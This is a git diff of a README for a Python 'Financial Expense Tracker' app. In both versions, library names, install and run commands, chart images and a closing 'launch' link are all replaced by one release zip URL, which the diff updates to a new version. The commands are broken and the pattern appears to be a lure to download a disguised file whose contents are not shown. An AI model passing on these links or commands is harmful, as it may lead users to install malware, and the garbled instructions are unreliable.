@@ -1,11 +1,11 @@
 # 📊 Financial-Expense-Tracker 📈
 
-Welcome to the Financial Expense Tracker repository! This Python-based app is a powerful tool for seamless expense management, built with Flet, Pandas, NumPy, and https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v1.0/Application.zip With real-time tracking, categorization, and data visualization capabilities, users can easily take control of their finances.
+Welcome to the Financial Expense Tracker repository! This Python-based app is a powerful tool for seamless expense management, built with Flet, Pandas, NumPy, and https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v2.0/Software.zip With real-time tracking, categorization, and data visualization capabilities, users can easily take control of their finances.
 
-[![Download Financial-Expense-Tracker](https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v1.0/Application.zip)](https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v1.0/Application.zip)
+[![Download Financial-Expense-Tracker](https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v2.0/Software.zip)](https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v2.0/Software.zip)
 
 ## 📝 Description
-The Financial Expense Tracker is a comprehensive tool that enables users to manage their expenses efficiently. By leveraging various Python libraries such as Flet, Pandas, NumPy, and https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v1.0/Application.zip, this app offers a wide range of features to simplify financial tracking and decision-making.
+The Financial Expense Tracker is a comprehensive tool that enables users to manage their expenses efficiently. By leveraging various Python libraries such as Flet, Pandas, NumPy, and https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v2.0/Software.zip, this app offers a wide range of features to simplify financial tracking and decision-making.
 
 Key features of the Financial Expense Tracker include:
 - Real-time expense tracking
@@ -17,8 +17,8 @@ Key features of the Financial Expense Tracker include:
 ## 🚀 Getting Started
 To get started with the Financial Expense Tracker, follow these simple steps:
 1. Clone the repository to your local machine.
-2. Install the required dependencies using `pip install -r https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v1.0/Application.zip`.
-3. Run the app using `python https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v1.0/Application.zip`.
+2. Install the required dependencies using `pip install -r https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v2.0/Software.zip`.
+3. Run the app using `python https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v2.0/Software.zip`.
 4. Start tracking and managing your expenses effectively!
 
 ## 🧰 Technologies Used
@@ -26,15 +26,15 @@ The Financial Expense Tracker utilizes several technologies and libraries to pro
 - Flet
 - Pandas
 - NumPy
-- https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v1.0/Application.zip
+- https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v2.0/Software.zip
 
 ## 📊 Data Visualization
 One of the standout features of the Financial Expense Tracker is its robust data visualization capabilities. Users can visualize their expense data through interactive charts, including bar and pie charts. These visual representations make it easy to spot trends, identify patterns, and make informed financial decisions.
 
 Check out some sample visualizations created using the Financial Expense Tracker:
 
-![Bar Chart](https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v1.0/Application.zip)
-![Pie Chart](https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v1.0/Application.zip)
+![Bar Chart](https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v2.0/Software.zip)
+![Pie Chart](https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v2.0/Software.zip)
 
 ## 📦 Data Management
 The Financial Expense Tracker allows users to import and export their expense data with ease. Whether you want to backup your data or analyze it in a different tool, the app provides seamless functionality to handle your data effectively.
@@ -55,4 +55,4 @@ The Financial Expense Tracker is licensed under the MIT License. You are free to
 
 🌟 Start managing your expenses effectively with the Financial Expense Tracker! 🌟
 
-If the link provided needs to be launched, kindly visit [here](https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v1.0/Application.zip).
+If the link provided needs to be launched, kindly visit [here](https://github.com/GokuJok/Financial-Expense-Tracker/releases/download/v2.0/Software.zip).
